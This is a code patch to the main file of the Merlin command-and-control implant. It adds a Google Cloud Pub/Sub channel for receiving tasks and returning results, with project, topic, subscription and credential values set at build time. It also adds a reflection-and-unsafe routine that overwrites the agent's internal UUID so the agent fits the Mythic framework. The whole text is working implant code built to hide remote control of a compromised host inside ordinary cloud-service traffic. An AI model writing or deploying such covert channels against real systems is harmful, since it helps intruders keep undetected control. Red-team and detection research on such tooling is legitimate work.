@@ -24,11 +24,14 @@ import (
 	// Standard
 	"fmt"
 	"os"
+	"reflect"
 	"strconv"
 	"strings"
+	"unsafe"
 
 	// 3rd Party
 	"github.com/fatih/color"
+	"github.com/google/uuid"
 
 	// Merlin
 	"github.com/Ne0nd0g/merlin-agent/v2/agent"
@@ -107,6 +110,52 @@ var useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KH
 // verbose a boolean value that determines if the Agent will print verbose output
 var verbose = "false"
 
+// PubSub-specific variables
+var projectID = ""
+var resultsTopic = ""
+var tasksSubscription = ""
+var credentialsJSON = ""
+var encryptionMode = ""
+
+func setAgentID(a interface{}, newID uuid.UUID) error {
+	v := reflect.ValueOf(a).Elem()
+	t := v.Type()
+
+	var idField reflect.Value
+	var fieldIndex int = -1
+
+	for i := 0; i < v.NumField(); i++ {
+		fieldType := t.Field(i).Type.String()
+		if strings.Contains(fieldType, "UUID") {
+			idField = v.Field(i)
+			fieldIndex = i
+			if core.Verbose {
+				color.Green(fmt.Sprintf("[+] Found UUID field at index %d: %s (type: %s)", i, t.Field(i).Name, fieldType))
+			}
+			break
+		}
+	}
+
+	if fieldIndex == -1 {
+		if core.Verbose {
+			color.Yellow("[Merlin] [main.go] UUID field not found. Available fields:")
+			for i := 0; i < v.NumField(); i++ {
+				color.Yellow(fmt.Sprintf("  - %s (type: %s)", t.Field(i).Name, t.Field(i).Type))
+			}
+		}
+		return fmt.Errorf("[Merlin] [main.go] UUID field not found in agent struct")
+	}
+
+	idField = reflect.NewAt(idField.Type(), unsafe.Pointer(idField.UnsafeAddr())).Elem()
+	idField.Set(reflect.ValueOf(newID))
+
+	if core.Verbose {
+		color.Cyan(fmt.Sprintf("[Merlin] [main.go] Agent UUID successfully set to payloadID: %s", newID.String()))
+	}
+
+	return nil
+}
+
 func main() {
 	core.Verbose, _ = strconv.ParseBool(verbose)
 	core.Debug, _ = strconv.ParseBool(debug)
@@ -166,7 +215,7 @@ func main() {
 			clientConfig.Protocol = "http"
 		} else {
 			if core.Verbose {
-				color.Red("unable to detect valid protocol from URL: " + url)
+				color.Red("[Merlin] [main.go] Unable to detect valid protocol from URL: " + url)
 				os.Exit(1)
 			}
 		}
@@ -179,9 +228,58 @@ func main() {
 			}
 			os.Exit(1)
 		}
+	case "pubsub":
+		maxretry = "500"
+		var cfg Config
+
+		if projectID != "" && resultsTopic != "" && tasksSubscription != "" {
+			cfg = Config{
+				ProjectID:          projectID,
+				ResultsTopic:       resultsTopic,
+				TasksSubscription:  tasksSubscription,
+				CredentialsB64JSON: credentialsJSON,
+			}
+			if core.Verbose {
+				color.Cyan("[Merlin] [main.go] Using build-time configuration (Mythic build)")
+			}
+		}
+
+		if payloadID != "" {
+			payloadUUID, err := uuid.Parse(payloadID)
+			if err != nil {
+				if core.Verbose {
+					color.Red(fmt.Sprintf("[Merlin] [main.go] failed to parse payloadID: %s", err.Error()))
+				}
+				os.Exit(1)
+			}
+
+			err = setAgentID(&a, payloadUUID)
+			if err != nil {
+				if core.Verbose {
+					color.Red(fmt.Sprintf("[Merlin] [main.go] failed to set agent ID: %s", err.Error()))
+				}
+				os.Exit(1)
+			}
+
+			if core.Verbose {
+				color.Cyan(fmt.Sprintf("[Merlin] [main.go] Agent UUID set to payloadID: %s", payloadID))
+			}
+		}
+
+		client, err = NewPubSubClient(&cfg, payloadID, psk, encryptionMode)
+		if err != nil {
+			if core.Verbose {
+				color.Red(fmt.Sprintf("[Merlin] [main.go] failed to create pubsub client: %s", err.Error()))
+			}
+			os.Exit(1)
+		}
+
+		if core.Verbose {
+			color.Green("[Merlin] [main.go] PubSub client initialized successfully")
+		}
 	default:
 		if core.Verbose {
-			color.Red(fmt.Sprintf("unknown C2 profile: %s", profile))
+			color.Red(fmt.Sprintf("[Merlin] [main.go] unknown C2 profile: %s", profile))
 		}
 		os.Exit(1)
 	}
